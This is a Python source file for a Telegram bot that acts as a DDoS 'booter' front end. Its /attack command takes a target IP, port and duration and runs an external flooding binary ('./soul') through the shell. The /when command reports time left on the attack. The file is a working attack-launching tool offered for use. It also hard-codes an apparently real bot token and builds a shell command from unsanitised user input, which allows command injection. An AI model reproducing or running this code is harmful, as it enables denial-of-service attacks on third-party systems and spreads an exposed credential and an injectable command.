import os
import telebot
import logging
import time
import asyncio

# Bot Token
TOKEN = '5299697243:AAHL3WvNyXjgrzuT7FE0-2YQO5-uTiXWWmM'  # Replace with your bot token @hackerpro728_bot
bot = telebot.TeleBot(TOKEN)

# Logging Configuration
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Interval for async operations
REQUEST_INTERVAL = 1

# Attack Status
bot.attack_in_progress = False
bot.attack_duration = 0  # Duration of the ongoing attack
bot.attack_start_time = 0  # Start time of the ongoing attack

# Blocked Ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Async Loop
loop = asyncio.get_event_loop()


async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)


async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 200")
    await process.communicate()
    bot.attack_in_progress = False


@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    chat_id = message.chat.id

    if bot.attack_in_progress:
        bot.send_message(chat_id, "*⚠️ Please wait!*\n"
                                   "*The bot is busy with another attack.*\n"
                                   "*Check remaining time with the /when command.*", parse_mode='Markdown')
        return

    bot.send_message(chat_id, "*💣 Ready to launch an attack?*\n"
                               "*Please provide the target IP, port, and duration in seconds.*\n"
                               "*Example: 167.67.25 6296 60*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_command)


def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*❗ Error!*\n"
                                               "*Please use the correct format: IP PORT DURATION.*", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*🔒 Port {target_port} is blocked.*\n"
                                               "*Please select a different port.*", parse_mode='Markdown')
            return
        if duration >= 600:
            bot.send_message(message.chat.id, "*⏳ Maximum duration is 599 seconds.*\n"
                                               "*Please shorten the duration.*", parse_mode='Markdown')
            return

        bot.attack_in_progress = True
        bot.attack_duration = duration
        bot.attack_start_time = time.time()

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*🚀 Attack Launched!*\n\n"
                                           f"*📡 Target Host: {target_ip}*\n"
                                           f"*👉 Target Port: {target_port}*\n"
                                           f"*⏰ Duration: {duration} seconds.*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")
        bot.send_message(message.chat.id, "*❌ An error occurred while processing your request.*", parse_mode='Markdown')


@bot.message_handler(commands=['when'])
def when_command(message):
    chat_id = message.chat.id
    if bot.attack_in_progress:
        elapsed_time = time.time() - bot.attack_start_time
        remaining_time = bot.attack_duration - elapsed_time

        if remaining_time > 0:
            bot.send_message(chat_id, f"*⏳ Time Remaining: {int(remaining_time)} seconds...*", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*🎉 The attack has successfully completed!*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*❌ No attack is currently in progress!*", parse_mode='Markdown')


@bot.message_handler(commands=['start'])
def start_message(message):
    try:
        bot.send_message(message.chat.id, "*🌍 Welcome!*\n\n"
                                           "*Use /attack to launch an attack.*\n"
                                           "*Example: Enter* `IP PORT DURATION`.", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in start command: {e}")


def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())


# Start the bot
if __name__ == "__main__":
    bot.polling(none_stop=True)
